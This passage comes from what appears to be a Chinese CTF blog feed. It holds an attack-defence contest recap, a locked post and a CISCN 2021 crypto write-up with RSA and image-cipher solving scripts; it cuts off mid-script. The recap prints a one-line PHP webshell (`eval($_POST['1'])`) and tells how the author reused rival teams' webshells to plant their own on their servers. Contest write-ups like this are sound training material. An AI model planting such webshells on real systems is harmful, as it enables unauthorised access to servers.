src="https://s3.bmp.ovh/imgs/2021/10/8bbbe66a1fd13c56.png"></p><blockquote><p>第一眼，这平台看着还挺好看？</p><p>再看一眼，确实好看，而且这HardCccc应该是个pwn题，我们pwn手有事干了（窃喜</p><p>总觉得哪里少点啥，再看一眼，nm，token都给我了，只能手动交flag？</p></blockquote><p>为了避免我个人以小人之心度君子之腹，于是哥们请教了众多运维小哥哥中的几位</p><blockquote><p>我：咱们平台有flag提交的api吗？</p><p>A：（疑惑脸）啥？</p><p>（我们俩看向B）</p><p>B：（故作镇定）怎么啦，平台有什么问题吗？</p><p>我：咱们平台flag提交的api在哪里呢？</p><p>B：（疑惑脸看向A）啥？</p><p>A：你说的是啥意思？</p><p>我：（无奈）咱们平台这个只能手动提交flag吗？</p><p>A：是的是的</p><p>B：手动交，要手动提交的</p></blockquote><p>这波啊，这波是我不懂事，明明主办方写平台都那么辛苦了，我居然还要求用api提交，<del>罪该万死</del></p><p>小事而已嘛，哥们自己改改脚本不就好了，找主办方的麻烦属于是我在这挑刺</p><p>帮队友调完ip之后，突然瞄见了自己前一天晚上写的<code>flowcopy.py</code>，于是打算起身去到运维组问问比赛给不给流量</p><blockquote><p>我：那个，我想问一下，咱们比赛的时候给流量吗</p><p>A：（看向B）他问给流量吗？</p><p>B：（不解）啥流量？</p><p>我：就是交互流量啊</p><p>B：有的，有的，都是能访问到的</p></blockquote><p>有人在致敬，但我不说是谁（逃</p><p>座位上发了会呆聊了会天，听主持人说了半天才知道，今天这比赛分两部分，高职组是解题，本科组是攻防，但大家坐在一个大厅，<del>说了半天什么谁可以联外网，谁不能外网……反正说了一大堆也没听懂</del></p><p>于是干等了一个小时比赛就开始了<del>（好像有哪个领导讲了点话，还宣布了比赛开始好像？</del></p><h3 id="比赛期间"><a href="#比赛期间" class="headerlink" title="比赛期间"></a>比赛期间</h3><p><strong>一句话总结：欢迎大家来到仙界！</strong></p><p>俩web一pwn，有半小时的加固时间，打算先去备份源码，下载完了之后打算看一眼主页长啥样，地址一输，俩题打开都是迎面而来的<code>Index of /</code>，于是哥们果断举手，结果主办方坚定的告诉我这题就这样，我心想完蛋了，这下web题都看不懂了，这不是得给达成筛子？算求，看不懂就看不懂，哥们只管打人就行了</p><h4 id="web1-SuperOA"><a href="#web1-SuperOA" class="headerlink" title="web1 SuperOA"></a>web1 SuperOA</h4><p>半小时加固时间一过，去看看别人的站长啥样，地址一访问之后给我看傻了，别人的站都有是模有样的登录界面，就我们是个空站，哥们于是自信举手跟运维组反应</p><blockquote><p>“您好，我们的环境和别人的不一样”</p><p>“啥意思？”</p><p>“你看我们的站一个php文件都没有”</p><p>“……”</p><p>“这个现在的index还是我自己写上去的”</p><p>“那你这就把index覆盖了啊”</p><p>“不是，我们这一个php都没有，我自己闲的没事干把自己站删了？连主页都没有不是要给check down？”</p><p>“……没事，你这文件夹都在，你继续加固就行”</p><p>“？这难道不是你们的问题？”</p><p>（转头离开）</p><p>“主页都没有你告诉我让我加固？”</p><p>（走远了）</p></blockquote><p>经过了多次尝试，确实发现是一点办法都没有，于是扣了50分重置，结果重置完我们自己的账号没权限，然后运维又调了好久我才有权限备份和上传，<del>（上面已经全是来自各地的🐎了）</del>，然后上了个waf，一打开，鬼鬼，警告日志直接给我弹满了，然后挂着waf抄流量，打了一圈之后我发现人均watchbird<del>（？真就waf大乱斗？</del></p><p>抄了几个payload，发现还是有憨憨没上waf，反正薅羊毛，大家一起薅</p><p>然后回服务器上准备删马，随手cat了几个看看都长啥样，突然看见有个<code>shell.php</code>，cat出来，直白的写着<code>eval($_POST[&#39;1&#39;]);</code></p><blockquote><p>？？？？？？？？？？？？？？？？？？？？？？？？？？？？？</p><p>现在人种马都不带密码的？</p></blockquote><p>反手骑着别人的马把自己的马种了上去，这波啊，这波是瞎猫碰见死耗子，<del>然后有了自己的马之后就为所欲为了</del>，20个队给我种上了9个，这位老哥属于是带功臣（逃</p><p>有个功能全开的waf在，基本全给拦下来了，最后就剩下几个删不掉的不死马，但是我也没办法了（</p><h4 id="web2-Baseflask"><a href="#web2-Baseflask" class="headerlink" title="web2 Baseflask"></a>web2 Baseflask</h4><p>这题更是有意思，从头到尾整个站都是空的，<del>里面除了别人的shell再啥也没有（？</del></p><p>我看了半天实在是不知道要怎么搞，然后没办法，反手来一个<code>find / -name &quot;*.php&quot;</code>，结果整个服务器上啥也没有，然后随手敲了个<code>find . -name &quot;*flag*&quot;</code>，突然发现除了flag文件还有个二进制文件叫<code>readflag</code>，于是下载下来拖进IDA看了一眼，伪代码大概如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">freopen</span>(<span class="string">&#x27;/flag&#x27;</span>,<span class="string">&#x27;r&#x27;</span>);</span><br><span class="line">cin &gt;&gt; flag;</span><br><span class="line">cout &lt;&lt; flag;</span><br></pre></td></tr></table></figure><blockquote><p>？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？</p><p>这又是个啥？这不是web题吗？</p></blockquote><p>然后看了一眼参赛手册，上面写着**”系统开放端口则需自行查看”**，于是哥们赶紧叫队友扫一下靶机开了哪些端口，有个9999，反手一连直接弹出来了个flag</p><p><del>nc就送flag，端口不回收，nc自由，我系Dawn_whisper，十月九日下午两点，和我一起大战领航杯（雾</del></p><blockquote><p>？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？</p><p>web题为啥给我开了个TCP服务？还是直接给flag那种？</p></blockquote><p>叫pwn手修好了之后，试着拿这种办法打一下别人的机子，好家伙，不打不知道，一打吓一跳，哥们一分钟写出来的exp，一次性打了17个flag（如图</p><p><img src="https://s3.bmp.ovh/imgs/2021/10/f5d4fc0cb33a1c26.png"></p><blockquote><p>？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？</p></blockquote><p><del>这exp直到最后一轮都还能打17个靶机，我严重怀疑这是pwn题（</del></p><h4 id="pwn-HardCccc"><a href="#pwn-HardCccc" class="headerlink" title="pwn HardCccc"></a>pwn HardCccc</h4><p>四个小时，全场零解，我的评价是：寄！</p><h4 id="关于平台"><a href="#关于平台" class="headerlink" title="关于平台"></a>关于平台</h4><p><del>只能说，除了看起来还行，没有一点点优点</del></p><p>连一次自己靶机要一分钟，上去就看见CPU利用率98%<del>（麻了</del>，然后自己还没权限<del>（麻中麻</del></p><p>本平台极度流畅，因为只要你访问太多次就判断你是恶意攻击</p><p>本平台极度友好，因为你根本看不到自己靶机有没有被打</p><p><img src="https://s3.bmp.ovh/imgs/2021/10/50960cdbe6244e67.png"></p><p>本平台极度智能，因为该平台可以随时生成奖状，自己需要即刻随时下载</p><p><img src="https://s3.bmp.ovh/imgs/2021/10/61e4f84cc51f4bec.png"></p><p>本平台极度负责，因为我们根本不进行题目check，所以根本不会有人被check down！</p><p>下午四点多哥们就发现自己web1的MySQL库又给别人扬了，但是还没check down，直到比赛快结束了才进行了人工check扣分，而且根据主持人所说，”扬了数据库属于违规行为，需要你们溯源，找到是谁扬了你们的数据库他们就会被扣除一千分”</p><blockquote><p>？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？</p><p>自己没修好被扬数据库算违规？而且还靠选手溯源找凶手（高，实在是高.jpg</p></blockquote><h3 id="结束"><a href="#结束" class="headerlink" title="结束"></a>结束</h3><p>全程靠waf大乱斗和几个马，还有理解不了的nc拿flag，迷迷糊糊打了个第五，<del>混了个二等奖（？</del></p><h2 id="赛后"><a href="#赛后" class="headerlink" title="赛后"></a>赛后</h2><p>微信推送</p><blockquote><p>本次竞赛由江苏天创科技公司自主研发的产品“天创红客训练营安全攻防实战竞赛平台”提供技术平台支持。</p><p>CnHongKe平台已广泛应用到政企单位以及各大赛事的平台支持中，帮助政府、金融、通信、公共安全、能源等关键信息基础设施行业选拔网络安全人才，培养更多网络安全技术人员，江苏天创红客训练营将继续打造国内公益赛事，为提高国内红客人员技能贡献微薄力量！</p></blockquote><p>我只能说，____</p><h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h2><p>蚌埠住了，还是蚌埠住了</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;2021领航杯&quot;&gt;&lt;a href=&quot;#2021领航杯&quot; class=&quot;headerlink&quot; title=&quot;2021领航杯&quot;&gt;&lt;/a&gt;2021领航杯&lt;/h1&gt;&lt;h2 id=&quot;初赛&quot;&gt;&lt;a href=&quot;#初赛&quot; class=&quot;headerlink&quot; title=&quot;初</summary>
      
    
    
    
    <category term="Life" scheme="http://example.com/categories/Life/"/>
    
    
    <category term="Life" scheme="http://example.com/tags/Life/"/>
    
    <category term="Web" scheme="http://example.com/tags/Web/"/>
    
    <category term="AWD" scheme="http://example.com/tags/AWD/"/>
    
  </entry>
  
  <entry>
    <title>AWD框架</title>
    <link href="http://example.com/2021/06/26/AWD%E6%A1%86%E6%9E%B6/"/>
    <id>http://example.com/2021/06/26/AWD%E6%A1%86%E6%9E%B6/</id>
    <published>2021-06-26T11:42:06.000Z</published>
    <updated>2022-03-30T08:23:42.000Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="89a9b5c70df2b8f52e194663b4545b536acd34e0a842b703934fd80be0bd36f2"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Please enter password to read.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">Please enter password to read.</summary>
    
    
    
    <category term="AWD" scheme="http://example.com/categories/AWD/"/>
    
    
    <category term="Web" scheme="http://example.com/tags/Web/"/>
    
    <category term="AWD" scheme="http://example.com/tags/AWD/"/>
    
  </entry>
  
  <entry>
    <title>First AWD at ciscn2021</title>
    <link href="http://example.com/2021/06/20/Frist_AWD_at_ciscn2021/"/>
    <id>http://example.com/2021/06/20/Frist_AWD_at_ciscn2021/</id>
    <published>2021-06-20T04:51:30.000Z</published>
    <updated>2021-06-20T06:39:24.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="祭第一次国赛-x2F-第一次AWD"><a href="#祭第一次国赛-x2F-第一次AWD" class="headerlink" title="祭第一次国赛&#x2F;第一次AWD"></a>祭第一次国赛&#x2F;第一次AWD</h1><p>华东北太卷啦太卷啦</p><h2 id="线上初赛"><a href="#线上初赛" class="headerlink" title="线上初赛"></a>线上初赛</h2><p>360搁这给我高考呢是不，一卷二卷三卷发来发去收来收去的，非要让人肝到凌晨三点</p><h3 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h3><h4 id="classic"><a href="#classic" class="headerlink" title="classic"></a>classic</h4><p>谜语人给爷死</p><ul><li>ADFGX密码</li><li>表<code>phqgmeaynofdxkrcvszwbutil</code></li><li>key <code>classic</code></li><li>密文反过来</li></ul><h4 id="rsa"><a href="#rsa" class="headerlink" title="rsa"></a>rsa</h4><p>Level1<code>e=3</code>，Level2<code>exgcd</code>，Level3<code>coppersmith</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">c1 = <span class="number">19105765285510667553313898813498220212421177527647187802549913914263968945493144633390670605116251064550364704789358830072133349108808799075021540479815182657667763617178044110939458834654922540704196330451979349353031578518479199454480458137984734402248011464467312753683234543319955893</span></span><br><span class="line">n1 = <span class="number">123814470394550598363280518848914546938137731026777975885846733672494493975703069760053867471836249473290828799962586855892685902902050630018312939010564945676699712246249820341712155938398068732866646422826619477180434858148938235662092482058999079105450136181685141895955574548671667320167741641072330259009</span></span><br><span class="line">e1 = <span class="number">3</span></span><br><span class="line">m1 = iroot(c1,e1)[<span class="number">0</span>]</span><br><span class="line">msg1 = long_to_bytes(m1)</span><br><span class="line"><span class="built_in">print</span>(msg1)</span><br><span class="line"></span><br><span class="line">n2 = <span class="number">111381961169589927896512557754289420474877632607334685306667977794938824018345795836303161492076539375959731633270626091498843936401996648820451019811592594528673182109109991384472979198906744569181673282663323892346854520052840694924830064546269187849702880332522636682366270177489467478933966884097824069977</span></span><br><span class="line">e2 = <span class="number">17</span></span><br><span class="line">e3 = <span class="number">65537</span></span><br><span class="line">c2 = <span class="number">54995751387258798791895413216172284653407054079765769704170763023830130981480272943338445245689293729308200574217959018462512790523622252479258419498858307898118907076773470253533344877959508766285730509067829684427375759345623701605997067135659404296663877453758701010726561824951602615501078818914410959610</span></span><br><span class="line">c3 = <span class="number">91290935267458356541959327381220067466104890455391103989639822855753797805354139741959957951983943146108552762756444475545250343766798220348240377590112854890482375744876016191773471853704014735936608436210153669829454288199838827646402742554134017280213707222338496271289894681312606239512924842845268366950</span></span><br><span class="line">gcd,a,b = gcdext(e2,e3)</span><br><span class="line"><span class="keyword">if</span>(a &lt; <span class="number">0</span>):</span><br><span class="line">    c2 = inverse(c2,n2)</span><br><span class="line">    a = -a</span><br><span class="line"><span class="keyword">if</span>(b &lt; <span class="number">0</span>):</span><br><span class="line">    c3 = inverse(c3,n2)</span><br><span class="line">    b = -b</span><br><span class="line">m2 = <span class="built_in">pow</span>(c2,a,n2) * <span class="built_in">pow</span>(c3,b,n2) % n2</span><br><span class="line">msg2 = long_to_bytes(m2)</span><br><span class="line"><span class="built_in">print</span>(msg2)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">n = 113432930155033263769270712825121761080813952100666693606866355917116416984149165507231925180593860836255402950358327422447359200689537217528547623691586008952619063846801829802637448874451228957635707553980210685985215887107300416969549087293746310593988908287181025770739538992559714587375763131132963783147</span></span><br><span class="line"><span class="string">p0 = 7117286695925472918001071846973900342640107770214858928188419765628151478620236042882657992902&lt;&lt;200</span></span><br><span class="line"><span class="string">kbits = 200</span></span><br><span class="line"><span class="string">PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span></span><br><span class="line"><span class="string">f = x + p0</span></span><br><span class="line"><span class="string">f = f.monic()</span></span><br><span class="line"><span class="string">x0 = f.small_roots(X=2^kbits, beta=0.4)[0]</span></span><br><span class="line"><span class="string">p = x0 + p0</span></span><br><span class="line"><span class="string">print(p)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">c3 = <span class="number">59213696442373765895948702611659756779813897653022080905635545636905434038306468935283962686059037461940227618715695875589055593696352594630107082714757036815875497138523738695066811985036315624927897081153190329636864005133757096991035607918106529151451834369442313673849563635248465014289409374291381429646</span></span><br><span class="line">n3 = <span class="number">113432930155033263769270712825121761080813952100666693606866355917116416984149165507231925180593860836255402950358327422447359200689537217528547623691586008952619063846801829802637448874451228957635707553980210685985215887107300416969549087293746310593988908287181025770739538992559714587375763131132963783147</span></span><br><span class="line">p3 = <span class="number">11437038763581010263116493983733546014403343859218003707512796706928880848035239990740428334091106443982769386517753703890002478698418549777553268906496423</span></span><br><span class="line">q3 = n3 // p3</span><br><span class="line"><span class="keyword">assert</span> p3*q3 == n3</span><br><span class="line">phi3 = (p3-<span class="number">1</span>) * (q3-<span class="number">1</span>)</span><br><span class="line">d3 = inverse(e3,phi3)</span><br><span class="line">m3 = <span class="built_in">pow</span>(c3,d3,n3)</span><br><span class="line">msg3 = long_to_bytes(m3)</span><br><span class="line"><span class="built_in">print</span>(msg3)</span><br><span class="line"></span><br><span class="line">msg = msg1 + msg2 + msg3</span><br><span class="line">flag = <span class="string">&quot;CISCN&#123;&quot;</span>+(md5(msg).hexdigest())+<span class="string">&quot;&#125;&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="imageencrypt"><a href="#imageencrypt" class="headerlink" title="imageencrypt"></a>imageencrypt</h4><p>首先因为<code>a^b=~a^~b</code>，用两个cipher和一个simple求出plain的前256位，接着再用一组对应的明文和密文求出key的可能配对还原出还原出bins之后去算xlist，接着算r，找到差距最小的基本上就是r的取值了由于精度损失，我们如果得到准确的x值较为困难，所以选择爆破x0，key1 key2 x0 r都已知，对cipher2再加密一次即可得到flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> md5</span><br><span class="line"></span><br><span class="line">temp = []</span><br><span class="line">cipher1 = []</span><br><span class="line">cipher2 = []</span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;out&quot;</span>,<span class="string">&quot;r&quot;</span>)</span><br><span class="line">data = f.readline()[<span class="number">1</span>:-<span class="number">2</span>].split(<span class="string">&quot;, &quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">    temp.append(<span class="built_in">int</span>(i))</span><br><span class="line">data = f.readline()[<span class="number">1</span>:-<span class="number">2</span>].split(<span class="string">&quot;, &quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">    cipher1.append(<span class="built_in">int</span>(i))</span><br><span class="line">data = f.readline()[<span class="number">1</span>:-<span class="number">2</span>].split(<span class="string">&quot;, &quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">    cipher2.append(<span class="built_in">int</span>(i))</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(temp) == <span class="number">16</span> * <span class="number">16</span></span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(cipher1) == <span class="number">16</span> * <span class="number">16</span></span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(cipher2) == <span class="number">24</span> * <span class="number">16</span></span><br><span class="line"></span><br><span class="line">plain = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>*<span class="number">16</span>):</span><br><span class="line">    plain.append(temp[i] ^ cipher1[i] ^ cipher2[i])</span><br><span class="line"></span><br><span class="line">dic = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>*<span class="number">16</span>):</span><br><span class="line">    ans = temp[i] ^ cipher1[i]</span><br><span class="line">    <span class="keyword">if</span>(ans <span class="keyword">not</span> <span class="keyword">in</span> dic):</span><br><span class="line">        dic[ans] = <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        dic[ans] += <span class="number">1</span></span><br><span class="line">    ans = plain[i] ^ cipher2[i]</span><br><span class="line">    <span class="keyword">if</span>(ans <span class="keyword">not</span> <span class="keyword">in</span> dic):</span><br><span class="line">        dic[ans] = <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        dic[ans] += <span class="number">1</span></span><br><span class="line"><span class="comment"># print(dic)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># r = 1.2</span></span><br><span class="line"><span class="comment"># key_pair = (78 or 177) &amp; (86 or 169)</span></span><br><span class="line">key1 = <span class="number">169</span></span><br><span class="line">key2 = <span class="number">78</span></span><br><span class="line"></span><br><span class="line">bin_x = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>*<span class="number">16</span>):</span><br><span class="line">    <span class="keyword">if</span>((temp[i] ^ key1)&amp;<span class="number">0xff</span> == cipher1[i]):</span><br><span class="line">        bin_x += <span class="string">&#x27;00&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span>((~temp[i] ^ key1)&amp;<span class="number">0xff</span> == cipher1[i]):</span><br><span class="line">        bin_x += <span class="string">&#x27;01&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span>((temp[i] ^ key2)&amp;<span class="number">0xff</span> == cipher1[i]):</span><br><span class="line">        bin_x += <span class="string">&#x27;10&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span>((~temp[i] ^ key2)&amp;<span class="number">0xff</span> == cipher1[i]):</span><br><span class="line">        bin_x += <span class="string">&#x27;11&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;ERROR&quot;</span>)</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line"><span class="comment"># print(bin_x)</span></span><br><span class="line"></span><br><span class="line">bin_xx = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>*<span class="number">16</span>):</span><br><span class="line">    <span class="keyword">if</span>((plain[i] ^ key1)&amp;<span class="number">0xff</span> == cipher2[i]):</span><br><span class="line">        bin_xx += <span class="string">&#x27;00&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span>((~plain[i] ^ key1)&amp;<span class="number">0xff</span> == cipher2[i]):</span><br><span class="line">        bin_xx += <span class="string">&#x27;01&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span>((plain[i] ^ key2)&amp;<span class="number">0xff</span> == cipher2[i]):</span><br><span class="line">        bin_xx += <span class="string">&#x27;10&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span>((~plain[i] ^ key2)&amp;<span class="number">0xff</span> == cipher2[i]):</span><br><span class="line">        bin_xx += <span class="string">&#x27;11&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;ERROR&quot;</span>)</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line"><span class="comment"># print(bin_xx)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> bin_x == bin_xx</span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(bin_x)%<span class="number">16</span> == <span class="number">0</span></span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(bin_xx)%<span class="number">16</span> == <span class="number">0</span></span><br><span class="line"></span><br><span class="line">x_list = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(bin_x)//<span class="number">16</span>):</span><br><span class="line">    <span class="comment"># print(i)</span></span><br><span class="line">    x = <span class="built_in">int</span>(bin_x[i*<span class="number">16</span>:i*<span class="number">16</span>+<span class="number">16</span>],<span class="number">2</span>)</span><br><span class="line">    data = <span class="built_in">round</span>(x/<span class="number">22000</span>,<span class="number">6</span>)</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">int</span>(data*<span class="number">22000</span>) == x):</span><br><span class="line">        x_list.append(data)</span><br><span class="line">    <span class="keyword">elif</span>(<span class="built_in">int</span>(<span class="built_in">round</span>(data-<span class="number">0.000001</span>,<span class="number">6</span>)*<span class="number">22000</span>) == x):</span><br><span class="line">        data = <span class="built_in">round</span>(data-<span class="number">0.000001</span>,<span class="number">6</span>)</span><br><span class="line">        x_list.append(data)</span><br><span class="line">    <span class="keyword">elif</span>(<span class="built_in">int</span>(<span class="built_in">round</span>(data+<span class="number">0.000001</span>,<span class="number">6</span>)*<span class="number">22000</span>) == x):</span><br><span class="line">        data = <span class="built_in">round</span>(data+<span class="number">0.000001</span>,<span class="number">6</span>)</span><br><span class="line">        x_list.append(data)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;ERROR&quot;</span>)</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">int</span>(x_list[i]*<span class="number">22000</span>) == x</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(x_list)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate</span>(<span class="params">x,r</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">round</span>(r*x*(<span class="number">3</span>-x),<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_r</span>(<span class="params">data</span>):</span><br><span class="line">    flag = <span class="number">0</span></span><br><span class="line">    r = <span class="built_in">round</span>(data[<span class="number">0</span>] / <span class="built_in">round</span>((data[<span class="number">1</span>]*(<span class="number">3</span>-data[<span class="number">1</span>])),<span class="number">6</span>),<span class="number">1</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;R:&quot;</span>,r)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data)-<span class="number">1</span>):</span><br><span class="line">        <span 